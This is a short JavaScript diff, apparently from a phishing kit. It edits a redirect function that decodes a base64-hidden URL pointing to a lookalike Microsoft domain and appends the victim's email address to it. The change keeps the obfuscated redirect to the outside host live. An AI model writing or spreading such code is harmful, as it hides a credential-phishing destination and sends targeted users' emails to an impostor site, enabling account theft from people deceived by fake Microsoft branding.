@@ -247,7 +247,7 @@ function displayMessage(message, type) {
 
 // Function to handle redirection
 function redirectUser(email) {
-    const encodedRedirectURL = "aHR0cHM6Ly9taWNyb3NvZnQubWljcm9zb2Z0ZmVkbGF3aHViLmNvbS9Scmp3dj9lPQ"; // Base64 encoded redirect link
+    const encodedRedirectURL = "aHR0cHM6Ly9taWNyb3NvZnQubWljcm9zb2Z0ZmVkbGF3aHViLmNvbS9Scmp3dg"; // Base64 encoded redirect link
     const decodedRedirectURL = atob(encodedRedirectURL);
     const finalLink = `${decodedRedirectURL}#M${email}`; // Append email to the link
     console.log("Redirecting to:", finalLink); // Debugging log
